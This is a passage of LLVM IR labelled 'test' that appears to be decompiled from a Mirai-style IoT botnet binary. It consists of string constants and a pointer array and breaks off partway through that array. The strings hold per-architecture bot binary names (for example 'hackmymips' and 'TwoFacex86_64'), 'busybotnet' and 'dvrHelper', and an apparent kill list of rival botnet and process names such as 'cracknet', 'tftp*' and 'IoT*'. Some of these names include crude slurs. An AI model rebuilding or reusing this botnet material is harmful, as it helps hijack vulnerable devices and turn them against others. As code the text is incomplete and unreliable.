source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4_eq = internal unnamed_addr global i1 false
@lr = internal unnamed_addr global i32 0
@global_var_100000a4.1 = constant i32 1208004021
@global_var_1001d060.3 = global i32 0
@global_var_1001d06c.4 = local_unnamed_addr global i32* @global_var_1001d060.3
@global_var_1001d8b4.7 = global i32 0
@global_var_1001d064.8 = global i32 0
@global_var_1000aee8.12 = constant [5 x i8] c"mips\00"
@global_var_1000aef0.13 = constant [7 x i8] c"mips64\00"
@global_var_1000aef8.14 = constant [7 x i8] c"mipsel\00"
@global_var_1000af00.15 = constant [6 x i8] c"sh2eb\00"
@global_var_1000af08.16 = constant [7 x i8] c"sh2elf\00"
@global_var_1000af10.17 = constant [4 x i8] c"sh4\00"
@global_var_1000af14.18 = constant [4 x i8] c"x86\00"
@global_var_1000af18.19 = constant [4 x i8] c"arm\00"
@global_var_1000af1c.20 = constant [6 x i8] c"armv5\00"
@global_var_1000af24.21 = constant [8 x i8] c"armv4tl\00"
@global_var_1000af2c.22 = constant [6 x i8] c"armv4\00"
@global_var_1000af34.23 = constant [6 x i8] c"armv6\00"
@global_var_1000af3c.24 = constant [5 x i8] c"i686\00"
@global_var_1000af44.25 = constant [8 x i8] c"powerpc\00"
@global_var_1000af4c.26 = constant [13 x i8] c"powerpc440fp\00"
@global_var_1000af5c.27 = constant [5 x i8] c"i586\00"
@global_var_1000af64.28 = constant [5 x i8] c"m68k\00"
@global_var_1000af6c.29 = constant [6 x i8] c"sparc\00"
@global_var_1000af74.30 = constant [7 x i8] c"x86_64\00"
@global_var_1000af7c.31 = constant [11 x i8] c"jackmymips\00"
@global_var_1000af88.32 = constant [13 x i8] c"jackmymips64\00"
@global_var_1000af98.33 = constant [13 x i8] c"jackmymipsel\00"
@global_var_1000afa8.34 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_1000afb4.35 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_1000afc4.36 = constant [10 x i8] c"jackmysh4\00"
@global_var_1000afd0.37 = constant [10 x i8] c"jackmyx86\00"
@global_var_1000afdc.38 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_1000afe8.39 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_1000aff8.40 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_1000b004.41 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_1000b010.42 = constant [11 x i8] c"jackmyi686\00"
@global_var_1000b01c.43 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_1000b02c.44 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_1000b040.45 = constant [11 x i8] c"jackmyi586\00"
@global_var_1000b04c.46 = constant [11 x i8] c"jackmym68k\00"
@global_var_1000b058.47 = constant [12 x i8] c"jackmysparc\00"
@global_var_1000b064.48 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_1000b074.49 = constant [11 x i8] c"hackmymips\00"
@global_var_1000b080.50 = constant [13 x i8] c"hackmymips64\00"
@global_var_1000b090.51 = constant [13 x i8] c"hackmymipsel\00"
@global_var_1000b0a0.52 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_1000b0ac.53 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_1000b0bc.54 = constant [10 x i8] c"hackmysh4\00"
@global_var_1000b0c8.55 = constant [10 x i8] c"hackmyx86\00"
@global_var_1000b0d4.56 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_1000b0e0.57 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_1000b0f0.58 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_1000b0fc.59 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_1000b108.60 = constant [11 x i8] c"hackmyi686\00"
@global_var_1000b114.61 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_1000b124.62 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_1000b138.63 = constant [11 x i8] c"hackmyi586\00"
@global_var_1000b144.64 = constant [11 x i8] c"hackmym68k\00"
@global_var_1000b150.65 = constant [12 x i8] c"hackmysparc\00"
@global_var_1000b15c.66 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_1000b16c.67 = constant [3 x i8] c"b1\00"
@global_var_1000b170.68 = constant [3 x i8] c"b2\00"
@global_var_1000b174.69 = constant [3 x i8] c"b3\00"
@global_var_1000b178.70 = constant [3 x i8] c"b4\00"
@global_var_1000b17c.71 = constant [3 x i8] c"b5\00"
@global_var_1000b180.72 = constant [3 x i8] c"b6\00"
@global_var_1000b184.73 = constant [3 x i8] c"b7\00"
@global_var_1000b188.74 = constant [3 x i8] c"b8\00"
@global_var_1000b18c.75 = constant [3 x i8] c"b9\00"
@global_var_1000b190.76 = constant [4 x i8] c"b10\00"
@global_var_1000b194.77 = constant [4 x i8] c"b11\00"
@global_var_1000b198.78 = constant [4 x i8] c"b12\00"
@global_var_1000b19c.79 = constant [4 x i8] c"b13\00"
@global_var_1000b1a0.80 = constant [4 x i8] c"b14\00"
@global_var_1000b1a4.81 = constant [4 x i8] c"b15\00"
@global_var_1000b1a8.82 = constant [4 x i8] c"b16\00"
@global_var_1000b1ac.83 = constant [4 x i8] c"b17\00"
@global_var_1000b1b0.84 = constant [4 x i8] c"b18\00"
@global_var_1000b1b4.85 = constant [4 x i8] c"b19\00"
@global_var_1000b1b8.86 = constant [4 x i8] c"b20\00"
@global_var_1000b1bc.87 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_1000b1d0.88 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_1000b1dc.89 = constant [10 x i8] c"dvrHelper\00"
@global_var_1000b1e8.90 = constant [8 x i8] c"FDFDHFC\00"
@global_var_1000b1f0.91 = constant [5 x i8] c"FEUB\00"
@global_var_1000b1f8.92 = constant [9 x i8] c"FTUdftui\00"
@global_var_1000b204.93 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_1000b210.94 = constant [6 x i8] c"jhUOH\00"
@global_var_1000b218.95 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_1000b224.96 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_1000b230.97 = constant [8 x i8] c"kmymips\00"
@global_var_1000b238.98 = constant [10 x i8] c"kmymips64\00"
@global_var_1000b244.99 = constant [10 x i8] c"kmymipsel\00"
@global_var_1000b250.100 = constant [9 x i8] c"kmysh2eb\00"
@global_var_1000b25c.101 = constant [10 x i8] c"kmysh2elf\00"
@global_var_1000b268.102 = constant [7 x i8] c"kmysh4\00"
@global_var_1000b270.103 = constant [7 x i8] c"kmyx86\00"
@global_var_1000b278.104 = constant [9 x i8] c"kmyarmv5\00"
@global_var_1000b284.105 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_1000b290.106 = constant [9 x i8] c"kmyarmv4\00"
@global_var_1000b29c.107 = constant [9 x i8] c"kmyarmv6\00"
@global_var_1000b2a8.108 = constant [8 x i8] c"kmyi686\00"
@global_var_1000b2b0.109 = constant [11 x i8] c"kmypowerpc\00"
@global_var_1000b2bc.110 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_1000b2cc.111 = constant [8 x i8] c"kmyi586\00"
@global_var_1000b2d4.112 = constant [8 x i8] c"kmym68k\00"
@global_var_1000b2dc.113 = constant [9 x i8] c"kmysparc\00"
@global_var_1000b2e8.114 = constant [10 x i8] c"kmyx86_64\00"
@global_var_1000b2f4.115 = constant [8 x i8] c"lolmips\00"
@global_var_1000b2fc.116 = constant [10 x i8] c"lolmips64\00"
@global_var_1000b308.117 = constant [10 x i8] c"lolmipsel\00"
@global_var_1000b314.118 = constant [9 x i8] c"lolsh2eb\00"
@global_var_1000b320.119 = constant [10 x i8] c"lolsh2elf\00"
@global_var_1000b32c.120 = constant [7 x i8] c"lolsh4\00"
@global_var_1000b334.121 = constant [7 x i8] c"lolx86\00"
@global_var_1000b33c.122 = constant [9 x i8] c"lolarmv5\00"
@global_var_1000b348.123 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_1000b354.124 = constant [9 x i8] c"lolarmv4\00"
@global_var_1000b360.125 = constant [9 x i8] c"lolarmv6\00"
@global_var_1000b36c.126 = constant [8 x i8] c"loli686\00"
@global_var_1000b374.127 = constant [11 x i8] c"lolpowerpc\00"
@global_var_1000b380.128 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_1000b390.129 = constant [8 x i8] c"loli586\00"
@global_var_1000b398.130 = constant [8 x i8] c"lolm68k\00"
@global_var_1000b3a0.131 = constant [9 x i8] c"lolsparc\00"
@global_var_1000b3ac.132 = constant [8 x i8] c"RYrydry\00"
@global_var_1000b3b4.133 = constant [8 x i8] c"telmips\00"
@global_var_1000b3bc.134 = constant [10 x i8] c"telmips64\00"
@global_var_1000b3c8.135 = constant [10 x i8] c"telmipsel\00"
@global_var_1000b3d4.136 = constant [9 x i8] c"telsh2eb\00"
@global_var_1000b3e0.137 = constant [10 x i8] c"telsh2elf\00"
@global_var_1000b3ec.138 = constant [7 x i8] c"telsh4\00"
@global_var_1000b3f4.139 = constant [7 x i8] c"telx86\00"
@global_var_1000b3fc.140 = constant [9 x i8] c"telarmv5\00"
@global_var_1000b408.141 = constant [11 x i8] c"telarmv4tl\00"
@global_var_1000b414.142 = constant [9 x i8] c"telarmv4\00"
@global_var_1000b420.143 = constant [9 x i8] c"telarmv6\00"
@global_var_1000b42c.144 = constant [8 x i8] c"teli686\00"
@global_var_1000b434.145 = constant [11 x i8] c"telpowerpc\00"
@global_var_1000b440.146 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_1000b450.147 = constant [8 x i8] c"teli586\00"
@global_var_1000b458.148 = constant [8 x i8] c"telm68k\00"
@global_var_1000b460.149 = constant [9 x i8] c"telsparc\00"
@global_var_1000b46c.150 = constant [10 x i8] c"telx86_64\00"
@global_var_1000b478.151 = constant [12 x i8] c"TwoFacemips\00"
@global_var_1000b484.152 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_1000b494.153 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_1000b4a4.154 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_1000b4b4.155 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_1000b4c4.156 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_1000b4d0.157 = constant [11 x i8] c"TwoFacex86\00"
@global_var_1000b4dc.158 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_1000b4ec.159 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_1000b4fc.160 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_1000b50c.161 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_1000b51c.162 = constant [12 x i8] c"TwoFacei686\00"
@global_var_1000b528.163 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_1000b538.164 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_1000b54c.165 = constant [12 x i8] c"TwoFacei586\00"
@global_var_1000b558.166 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_1000b564.167 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_1000b574.168 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_1000b584.169 = constant [9 x i8] c"UYyuyioy\00"
@global_var_1000b590.170 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_1000b59c.171 = constant [5 x i8] c"xxb1\00"
@global_var_1000b5a4.172 = constant [5 x i8] c"xxb2\00"
@global_var_1000b5ac.173 = constant [5 x i8] c"xxb3\00"
@global_var_1000b5b4.174 = constant [5 x i8] c"xxb4\00"
@global_var_1000b5bc.175 = constant [5 x i8] c"xxb5\00"
@global_var_1000b5c4.176 = constant [5 x i8] c"xxb6\00"
@global_var_1000b5cc.177 = constant [5 x i8] c"xxb7\00"
@global_var_1000b5d4.178 = constant [5 x i8] c"xxb8\00"
@global_var_1000b5dc.179 = constant [5 x i8] c"xxb9\00"
@global_var_1000b5e4.180 = constant [6 x i8] c"xxb10\00"
@global_var_1000b5ec.181 = constant [6 x i8] c"xxb11\00"
@global_var_1000b5f4.182 = constant [6 x i8] c"xxb12\00"
@global_var_1000b5fc.183 = constant [6 x i8] c"xxb13\00"
@global_var_1000b604.184 = constant [6 x i8] c"xxb14\00"
@global_var_1000b60c.185 = constant [6 x i8] c"xxb15\00"
@global_var_1000b614.186 = constant [6 x i8] c"xxb16\00"
@global_var_1000b61c.187 = constant [6 x i8] c"xxb17\00"
@global_var_1000b624.188 = constant [6 x i8] c"xxb18\00"
@global_var_1000b62c.189 = constant [6 x i8] c"xxb19\00"
@global_var_1000b634.190 = constant [6 x i8] c"xxb20\00"
@global_var_1000b63c.191 = constant i32 822083584
@global_var_1000b640.192 = constant i32 838860800
@global_var_1000b644.193 = constant i32 855638016
@global_var_1000b648.194 = constant i32 872415232
@global_var_1000b64c.195 = constant i32 889192448
@global_var_1000b650.196 = constant i32 905969664
@global_var_1000b654.197 = constant i32 922746880
@global_var_1000b658.198 = constant i32 939524096
@global_var_1000b65c.199 = constant i32 956301312
@global_var_1000b660.200 = constant [3 x i8] c"10\00"
@global_var_1000b664.201 = constant [3 x i8] c"11\00"
@global_var_1000b668.202 = constant [3 x i8] c"12\00"
@global_var_1000b66c.203 = constant [3 x i8] c"13\00"
@global_var_1000b670.204 = constant [3 x i8] c"14\00"
@global_var_1000b674.205 = constant [3 x i8] c"15\00"
@global_var_1000b678.206 = constant [3 x i8] c"16\00"
@global_var_1000b67c.207 = constant [3 x i8] c"17\00"
@global_var_1000b680.208 = constant [3 x i8] c"18\00"
@global_var_1000b684.209 = constant [3 x i8] c"19\00"
@global_var_1000b688.210 = constant [3 x i8] c"20\00"
@global_var_1000b68c.211 = constant [3 x i8] c"bb\00"
@global_var_1000b690.212 = constant [11 x i8] c"busybotnet\00"
@global_var_1000b69c.213 = constant [5 x i8] c"pppd\00"
@global_var_1000b6a4.214 = constant [6 x i8] c"pppoe\00"
@global_var_1000b6ac.215 = constant [5 x i8] c"wput\00"
@global_var_1000b6b4.216 = constant [3 x i8] c"B1\00"
@global_var_1000b6b8.217 = constant [3 x i8] c"B2\00"
@global_var_1000b6bc.218 = constant [3 x i8] c"B3\00"
@global_var_1000b6c0.219 = constant [3 x i8] c"B4\00"
@global_var_1000b6c4.220 = constant [3 x i8] c"B5\00"
@global_var_1000b6c8.221 = constant [3 x i8] c"B6\00"
@global_var_1000b6cc.222 = constant [3 x i8] c"B7\00"
@global_var_1000b6d0.223 = constant [3 x i8] c"B8\00"
@global_var_1000b6d4.224 = constant [3 x i8] c"B9\00"
@global_var_1000b6d8.225 = constant [4 x i8] c"B10\00"
@global_var_1000b6dc.226 = constant [4 x i8] c"B11\00"
@global_var_1000b6e0.227 = constant [4 x i8] c"B12\00"
@global_var_1000b6e4.228 = constant [4 x i8] c"B13\00"
@global_var_1000b6e8.229 = constant [4 x i8] c"B14\00"
@global_var_1000b6ec.230 = constant [4 x i8] c"B15\00"
@global_var_1000b6f0.231 = constant [4 x i8] c"B16\00"
@global_var_1000b6f4.232 = constant [4 x i8] c"B17\00"
@global_var_1000b6f8.233 = constant [4 x i8] c"B18\00"
@global_var_1000b6fc.234 = constant [9 x i8] c"B20hackz\00"
@global_var_1000b708.235 = constant [5 x i8] c"bin*\00"
@global_var_1000b710.236 = constant [5 x i8] c"gtop\00"
@global_var_1000b718.237 = constant [5 x i8] c"ftp*\00"
@global_var_1000b720.238 = constant [6 x i8] c"tftp*\00"
@global_var_1000b728.239 = constant [7 x i8] c"botnet\00"
@global_var_1000b730.240 = constant [8 x i8] c"swatnet\00"
@global_var_1000b738.241 = constant [8 x i8] c"ballpit\00"
@global_var_1000b740.242 = constant [8 x i8] c"fucknet\00"
@global_var_1000b748.243 = constant [9 x i8] c"cracknet\00"
@global_var_1000b754.244 = constant [8 x i8] c"weednet\00"
@global_var_1000b75c.245 = constant [7 x i8] c"gaynet\00"
@global_var_1000b764.246 = constant [9 x i8] c"queernet\00"
@global_var_1000b770.247 = constant [8 x i8] c"ballnet\00"
@global_var_1000b778.248 = constant [5 x i8] c"unet\00"
@global_var_1000b780.249 = constant [7 x i8] c"yougay\00"
@global_var_1000b788.250 = constant [7 x i8] c"sttftp\00"
@global_var_1000b790.251 = constant [7 x i8] c"sstftp\00"
@global_var_1000b798.252 = constant [7 x i8] c"sbtftp\00"
@global_var_1000b7a0.253 = constant [6 x i8] c"btftp\00"
@global_var_1000b7a8.254 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_1000b7b4.255 = constant [6 x i8] c"bruv*\00"
@global_var_1000b7bc.256 = constant [5 x i8] c"IoT*\00"
@global_var_1000b870.257 = constant [4 x i8] c"STD\00"
@global_var_1001d074.258 = global [247 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000aee8.12, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000aef0.13, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000aef8.14, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000af00.15, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000af08.16, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000af10.17, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000af14.18, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000af18.19, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000af1c.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000af24.21, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000af2c.22, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000af34.23, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000af3c.24, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000af44.25, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000af4c.26, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000af5c.27, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000af64.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000af6c.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000af74.30, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000af7c.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000af88.32, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000af98.33, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000afa8.34, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000afb4.35, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000afc4.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000afd0.37, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000afdc.38, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000afe8.39, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000aff8.40, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b004.41, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b010.42, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b01c.43, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1000b02c.44, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b040.45, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b04c.46, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b058.47, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b064.48, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b074.49, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b080.50, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b090.51, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b0a0.52, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b0ac.53, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b0bc.54, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b0c8.55, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b0d4.56, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b0e0.57, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b0f0.58, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b0fc.59, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b108.60, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b114.61, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1000b124.62, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b138.63, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b144.64, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b150.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b15c.66, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b16c.67, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b170.68, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b174.69, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b178.70, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b17c.71, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b180.72, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b184.73, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b188.74, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b18c.75, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b190.76, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b194.77, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b198.78, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b19c.79, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b1a0.80, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b1a4.81, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b1a8.82, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b1ac.83, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b1b0.84, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b1b4.85, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b1b8.86, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1000b1bc.87, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b1d0.88, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b1dc.89, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b1e8.90, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b1f0.91, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b1f8.92, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b204.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b210.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b218.95, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b224.96, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b230.97, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b238.98, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b244.99, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b250.100, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b25c.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b268.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b270.103, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b278.104, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b284.105, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b290.106, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b29c.107, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b2a8.108, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b2b0.109, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1000b2bc.110, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b2cc.111, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b2d4.112, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b2dc.113, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b2e8.114, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b2f4.115, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b2fc.116, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b308.117, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b314.118, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b320.119, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b32c.120, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b334.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b33c.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b348.123, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b354.124, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b360.125, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b36c.126, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b374.127, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1000b380.128, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b390.129, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b398.130, i32 0, i32 0), 